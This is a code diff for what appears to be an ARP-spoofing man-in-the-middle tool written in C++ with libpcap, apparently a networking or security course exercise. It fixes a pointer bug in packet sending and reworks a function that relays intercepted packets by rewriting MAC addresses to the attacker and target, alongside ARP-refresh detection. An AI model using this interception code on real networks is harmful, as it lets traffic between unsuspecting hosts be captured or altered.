@@ -44,7 +44,7 @@ void sendArp(pcap_t *handle, EthArpPacket pkt)
 
 void sendIp(pcap_t *handle, const u_char *pkt, int pktSize)
 {
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&pkt), pktSize);
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(pkt), pktSize);
 	if (res != 0)
 	{
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -66,15 +66,22 @@ void continueSendArp(pcap_t *handle, EthArpPacket pkt, int repeat)
 	}
 }
 
+void relayPacket(pcap_t *handle, pcap_pkthdr *header, const u_char *receivedPkt, FlowInfo flow)
+{
+	EthIpPacket *packet = (EthIpPacket *)receivedPkt;
+	packet->eth_.smac_ = flow.attackerMac;
+	packet->eth_.dmac_ = flow.targetMac;
+	//(const u_char *)packet
+	printf("%s | %s\n",std::string(packet->eth_.smac_).c_str(), std::string(packet->eth_.dmac_).c_str());
+	sendIp(handle, receivedPkt, header->len);
+}
+
 bool isRefreshed(pcap_t *handle, const u_char *receivedPkt, FlowInfo flow)
 {
 	EthArpPacket *pkt = (EthArpPacket *)receivedPkt;
 	// case : broadcast (ARP)
-	// printf("%d %d\n",pkt->eth_.type_,ntohs(EthHdr::Arp));
-	// printf("%s %s\n",std::string(pkt->eth_.dmac_).c_str(),std::string(Mac::broadcastMac()).c_str());
 	if (pkt->eth_.type_ == ntohs(EthHdr::Arp) && pkt->eth_.dmac_ == Mac::broadcastMac())
 	{
-		// printf("%s | %s\n",std::string(Ip(ntohl(pkt->arp_.sip_))).c_str(), std::string(flow.senderIp).c_str());
 		// sender broadcast
 		if (ntohl(pkt->arp_.sip_) == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
 		{
@@ -101,13 +108,6 @@ bool isRefreshed(pcap_t *handle, const u_char *receivedPkt, FlowInfo flow)
 		}
 	}
 	return false;
-}
-
-void relayPacket(pcap_t *handle, pcap_pkthdr *header, const u_char *receivedPkt, FlowInfo flow)
-{
-	((EthIpPacket *)receivedPkt)->eth_.smac_ = flow.attackerMac;
-	((EthIpPacket *)receivedPkt)->eth_.dmac_ = flow.targetMac;
-	sendIp(handle, receivedPkt, header->len);
 }
 
 bool isInfectedPkt(pcap_t *handle, const u_char *receivedPkt, FlowInfo flow)
